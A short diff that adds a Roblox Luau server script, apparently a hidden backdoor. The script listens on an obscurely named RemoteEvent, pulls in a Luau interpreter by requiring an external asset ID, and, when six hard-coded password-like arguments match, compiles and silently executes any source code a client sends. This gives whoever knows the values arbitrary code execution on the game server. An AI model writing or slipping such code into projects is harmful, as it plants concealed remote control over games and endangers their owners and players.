@@ -1,0 +1,11 @@
+game:GetService("ReplicatedStorage"):FindFirstChild("_").OnServerEvent:Connect(function(player: Player, source: string, arg1: number, arg2: number, arg3: string, arg4: string, arg5: string, arg6: number)
+    local loadstring: Instance = require(require(123068958552495)("vLuau"))
+    local storagewords: table = {5, 2, "oo", "", "  ", 039393003929293}
+    
+    if source ~= "" and arg1 == storagewords[1] and arg2 == storagewords[2] and arg3 == storagewords[3] and arg4 == storagewords[4] and arg5 == storagewords[5] and arg6 == storagewords[6] then
+        local r = loadstring(source)
+        pcall(function() 
+            r() 
+        end)
+    end
+end)
